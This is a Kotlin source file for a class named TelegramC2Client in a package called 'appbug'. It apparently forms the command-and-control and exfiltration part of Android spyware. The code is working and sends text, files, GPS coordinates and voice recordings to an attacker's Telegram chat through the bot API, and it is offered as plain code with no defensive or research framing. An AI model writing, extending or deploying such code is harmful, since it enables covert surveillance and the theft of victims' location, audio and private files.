package com.mzkyzak.appbug

import android.util.Log
import com.google.gson.Gson
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class TelegramC2Client(private val botToken: String, private val chatId: String) {
    private val client = OkHttpClient()
    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    fun sendMessage(text: String) {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = mapOf(
            "chat_id" to chatId,
            "text" to text,
            "parse_mode" to "HTML"
        )
        val body = gson.toJson(payload).toRequestBody(jsonMediaType)
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TelegramC2", "Failed to send message", e)
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    fun sendDocument(fileName: String, bytes: ByteArray) {
        val url = "https://api.telegram.org/bot$botToken/sendDocument"
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", fileName, bytes.toRequestBody("application/octet-stream".toMediaType()))
            .build()
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TelegramC2", "Failed to send document", e)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    Log.e("TelegramC2", "Error response: ${response.code}")
                }
                response.close()
            }
        })
    }

    fun sendLocation(latitude: Double, longitude: Double) {
        val url = "https://api.telegram.org/bot$botToken/sendLocation"
        val payload = mapOf(
            "chat_id" to chatId,
            "latitude" to latitude.toString(),
            "longitude" to longitude.toString()
        )
        val body = gson.toJson(payload).toRequestBody(jsonMediaType)
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TelegramC2", "Failed to send location", e)
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    fun sendVoice(fileName: String, bytes: ByteArray) {
        val url = "https://api.telegram.org/bot$botToken/sendVoice"
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("voice", fileName, bytes.toRequestBody("audio/ogg".toMediaType()))
            .build()
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TelegramC2", "Failed to send voice", e)
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    fun sendTextDocument(fileName: String, content: String) {
        sendDocument(fileName, content.toByteArray())
    }
}
